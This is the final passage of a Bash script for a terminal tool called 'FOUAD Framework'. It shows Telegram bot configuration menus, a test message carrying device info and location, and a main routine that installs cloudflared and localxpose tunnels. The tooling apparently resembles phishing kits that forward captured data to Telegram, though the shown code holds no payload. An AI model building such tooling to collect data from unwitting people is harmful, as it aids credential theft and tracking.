		echo -e "\n${NEON_GREEN}✅ Telegram bot configured successfully!${RESET}"
		echo -e "${LIGHT_CYAN}Check your Telegram for the test message.${RESET}"
	else
		echo -e "\n${LIGHT_RED}❌ Failed to send test message!${RESET}"
		echo -e "${LIGHT_YELLOW}Please check your bot token and chat ID.${RESET}"
		rm -f "$TELEGRAM_CONFIG_FILE"
		sleep 3
		return 1
	fi
	
	sleep 3
}

# Telegram bot menu
telegram_bot_menu() {
	clear
	banner_small
	echo
	
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_BLUE}🤖 TELEGRAM BOT INTEGRATION ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

		${NEON_BLUE}[${GOLD}01${NEON_BLUE}]${NEON_GREEN} Configure Bot ${LIGHT_CYAN}[${NEON_PINK}Setup Token & Chat ID${LIGHT_CYAN}]
		${NEON_BLUE}[${GOLD}02${NEON_BLUE}]${LIGHT_PURPLE} Test Connection ${LIGHT_CYAN}[${NEON_GREEN}Send Test Message${LIGHT_CYAN}]
		${NEON_BLUE}[${GOLD}03${NEON_BLUE}]${LIGHT_YELLOW} View Status ${LIGHT_CYAN}[${LIGHT_BLUE}Check Configuration${LIGHT_CYAN}]
		${NEON_BLUE}[${GOLD}04${NEON_BLUE}]${LIGHT_RED} Remove Config ${LIGHT_CYAN}[${LIGHT_RED}Delete Settings${LIGHT_CYAN}]

		${GOLD}┌─────────────────────────────────────────────────────────┐
		${NEON_BLUE}[${GOLD}00${NEON_BLUE}]${NEON_GREEN} Main Menu
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

	EOF
	
	read -p "${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${NEON_GREEN} Choose option: ${NEON_PINK}"
	
	case $REPLY in
		1 | 01)
			configure_telegram_bot;;
		2 | 02)
			test_telegram_connection;;
		3 | 03)
			show_telegram_status;;
		4 | 04)
			remove_telegram_config;;
		0 | 00)
			main_menu;;
		*)
			echo -ne "\n${LIGHT_RED}❌ Invalid option! Try again...${RESET}"
			sleep 1
			telegram_bot_menu;;
	esac
}

# Test Telegram connection
test_telegram_connection() {
	if [[ ! -f "$TELEGRAM_CONFIG_FILE" ]]; then
		echo -e "\n${LIGHT_RED}❌ No Telegram configuration found!${RESET}"
		echo -e "${LIGHT_YELLOW}Please configure the bot first.${RESET}"
		sleep 2
		telegram_bot_menu
		return
	fi
	
	loading_animation "Testing Telegram connection" 2
	
	local test_message="🧪 <b>Connection Test</b>

✅ FOUAD Framework is online
🕐 $(date '+%Y-%m-%d %H:%M:%S')
$(get_device_info)
$(get_location)"
	
	if send_telegram_message "$test_message"; then
		echo -e "\n${NEON_GREEN}✅ Test message sent successfully!${RESET}"
	else
		echo -e "\n${LIGHT_RED}❌ Failed to send test message!${RESET}"
	fi
	
	sleep 2
	telegram_bot_menu
}

# Show Telegram status
show_telegram_status() {
	clear
	banner_small
	echo
	
	if [[ -f "$TELEGRAM_CONFIG_FILE" ]]; then
		source "$TELEGRAM_CONFIG_FILE"
		cat <<- EOF
			${GOLD}┌─────────────────────────────────────────────────────────┐
			${GOLD}│ ${NEON_GREEN}✅ TELEGRAM BOT STATUS ${GOLD}│
			${GOLD}└─────────────────────────────────────────────────────────┘${RESET}
			
			${NEON_GREEN}🤖 Bot Token: ${LIGHT_CYAN}${TELEGRAM_BOT_TOKEN:0:20}...
			${NEON_GREEN}💬 Chat ID: ${LIGHT_CYAN}$TELEGRAM_CHAT_ID
			${NEON_GREEN}📱 Status: ${LIGHT_GREEN}CONFIGURED
			${NEON_GREEN}🔔 Notifications: ${LIGHT_GREEN}ENABLED
			
		EOF
	else
		cat <<- EOF
			${GOLD}┌─────────────────────────────────────────────────────────┐
			${GOLD}│ ${LIGHT_RED}❌ TELEGRAM BOT STATUS ${GOLD}│
			${GOLD}└─────────────────────────────────────────────────────────┘${RESET}
			
			${LIGHT_RED}🤖 Bot Token: ${LIGHT_CYAN}Not configured
			${LIGHT_RED}💬 Chat ID: ${LIGHT_CYAN}Not configured
			${LIGHT_RED}📱 Status: ${LIGHT_RED}DISABLED
			${LIGHT_RED}🔔 Notifications: ${LIGHT_RED}DISABLED
			
		EOF
	fi
	
	echo -ne "${NEON_BLUE}Press ENTER to continue...${RESET}"
	read
	telegram_bot_menu
}

# Remove Telegram configuration
remove_telegram_config() {
	echo -ne "\n${LIGHT_RED}⚠️  Remove Telegram configuration? [y/N]: ${RESET}"
	read -n1 confirm
	
	if [[ ${confirm,,} == "y" ]]; then
		rm -f "$TELEGRAM_CONFIG_FILE"
		echo -e "\n\n${NEON_GREEN}✅ Telegram configuration removed!${RESET}"
	else
		echo -e "\n\n${LIGHT_CYAN}Configuration kept.${RESET}"
	fi
	
	sleep 2
	telegram_bot_menu
}

## Enhanced Main Execution
main() {
	# Play startup sound
	play_sound "startup"
	
	# Run startup sequence
	fouad_startup
	
	# Initialize core functions
	kill_pid
	dependencies
	check_status
	install_cloudflared
	install_localxpose
	
	# Launch main menu
	main_menu
}

## Execute Main Function
main
